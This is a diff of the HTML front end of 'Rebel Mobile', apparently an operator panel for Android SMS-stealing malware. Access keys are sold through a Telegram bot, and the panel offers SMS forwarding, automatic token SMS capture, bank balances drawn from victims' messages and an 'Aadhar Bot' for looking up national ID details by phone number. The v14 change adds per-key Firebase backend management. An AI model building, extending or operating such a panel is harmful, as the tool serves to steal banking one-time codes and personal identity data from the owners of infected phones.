@@ -53,9 +53,9 @@
       </div>
       <h1 class="glitch-sm" data-text="Rebel Mobile"><em>Rebel</em> Mobile</h1>
     </div>
-    <p class="login-sub">Key from Telegram — @Rebelpanelbot → /genkey</p>
+    <p class="login-sub">APK key from Telegram — @Rebelpanelbot → /genkeyapk</p>
     <div class="login-err" id="loginErr"></div>
-    <input class="key-input" id="loginKey" placeholder="RBL-XXXXXX-XXXXXX" autocomplete="off" maxlength="32"/>
+    <input class="key-input" id="loginKey" placeholder="RBA-XXXXXX-XXXXXX" autocomplete="off" maxlength="32"/>
     <label class="remember"><input type="checkbox" id="rememberMe" checked/> Remember this phone</label>
     <button class="btn-primary" id="loginBtn" onclick="doLogin()"><span class="btn-label">Unlock Panel</span></button>
   </div>
@@ -71,6 +71,7 @@
       <div>
         <div class="hdr-title">Rebel Mobile <span class="live-dot" id="hdrLive"></span></div>
         <div class="hdr-sub" id="hdrSub">Connecting...</div>
+        <div class="access-key-badge" id="accessKeyBadge">Key: —</div>
       </div>
     </div>
     <div class="hdr-actions">
@@ -83,7 +84,7 @@
     <div class="side-menu-hdr">
       <div>
         <div class="side-menu-title">Rebel Panel</div>
-        <div class="side-menu-ver" id="panelVerBadge">Panel v11</div>
+        <div class="side-menu-ver" id="panelVerBadge">Panel v14</div>
       </div>
       <button class="side-menu-close" onclick="closeSideMenu()">✕</button>
     </div>
@@ -101,7 +102,8 @@
       <button class="side-item" onclick="menuDevTab('perms')"><span class="side-ico">🔐</span>Permissions</button>
       <button class="side-item" onclick="menuDevTab('forward')"><span class="side-ico">↪</span>Forward SMS</button>
       <div class="side-section">Tools</div>
-      <button class="side-item" onclick="menuOpenFb()"><span class="side-ico">🔥</span>Firebase <span class="side-meta" id="moreFbName">—</span></button>
+      <button class="side-item" onclick="menuOpenFb()"><span class="side-ico">🔥</span>Manage Firebase <span class="side-meta" id="moreFbName">—</span></button>
+      <button class="side-item" onclick="menuSwitchFb()"><span class="side-ico">⇄</span>Switch Firebase</button>
       <button class="side-item" onclick="menuToggleAutoToken()"><span class="side-ico">🤖</span>Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></button>
       <button class="side-item" onclick="menuSetAutoDevice()"><span class="side-ico">📲</span>Set Auto SMS Device</button>
       <button class="side-item" onclick="menuOpenAadhar()"><span class="side-ico">🪪</span>Aadhar Bot</button>
@@ -137,7 +139,7 @@
 
     <section class="screen" id="screen-sms">
       <div class="solid-panel full-h">
-        <div class="panel-title">SMS Inbox <span style="font-size:9px;color:var(--muted);font-weight:600">· latest top · v13</span></div>
+        <div class="panel-title">SMS Inbox <span id="smsSortBadge" style="font-size:9px;color:var(--muted);font-weight:600">· latest top · v14</span></div>
         <div id="smsEmpty" class="empty-state"><div class="ico">💬</div>Select a device to view SMS</div>
         <div class="sms-list" id="smsList"></div>
       </div>
@@ -149,7 +151,7 @@
           <div class="panel-title" style="margin:0">Bank Account Summary</div>
           <span class="bank-badge" id="bankCountBadge">0 Banks</span>
         </div>
-        <div id="bankEmpty" class="empty-state"><div class="ico">🏦</div>Select a device — SMS se bank balance auto load</div>
+        <div id="bankEmpty" class="empty-state"><div class="ico">🏦</div>Select a device to load bank balances from SMS</div>
         <div id="bankList" class="bank-list"></div>
       </div>
     </section>
@@ -187,11 +189,25 @@
 </div>
 <div class="toast-wrap" id="toasts"></div>
 
+<div class="modal-overlay hidden" id="firebaseModal" onclick="closeFirebaseModal(event)">
+  <div class="modal-card fb-modal" onclick="event.stopPropagation()">
+    <button class="modal-close" onclick="closeFirebaseModal()">✕</button>
+    <h2>🔥 Manage Firebase</h2>
+    <p class="modal-sub">Projects are saved per access key. Each key only sees its own Firebase links.</p>
+    <div class="fb-paste-wrap">
+      <label class="form-label">Paste Firebase URL or config JSON</label>
+      <textarea class="form-textarea fb-paste-input" id="fbPasteInput" placeholder="https://your-project.firebaseio.com or full google-services JSON"></textarea>
+      <button class="btn-send" onclick="submitFirebasePaste()">Connect Firebase</button>
+    </div>
+    <div class="fb-manager-list" id="fbManagerList"></div>
+  </div>
+</div>
+
 <div class="modal-overlay hidden" id="aadharModal" onclick="closeAadhar(event)">
   <div class="modal-card" onclick="event.stopPropagation()">
     <button class="modal-close" onclick="closeAadhar()">✕</button>
     <h2>🪪 Aadhar Bot</h2>
-    <p class="modal-sub">Mobile number se aadhar lookup (sex.php API)</p>
+    <p class="modal-sub">Look up Aadhar details by mobile number</p>
     <input class="form-input" id="aadharNum" type="tel" placeholder="9876543210" onkeydown="if(event.key==='Enter')lookupAadhar()"/>
     <button class="btn-send" onclick="lookupAadhar()" style="margin-top:12px">Lookup</button>
     <div id="aadharStatus" class="modal-status"></div>
@@ -199,7 +215,7 @@
   </div>
 </div>
 
-<!-- panel-v13 SMS newest-first fix (robust sort) -->
+<!-- panel-v14 per-key Firebase isolation -->
 <script src="app.js"></script>
 </body>
 </html>
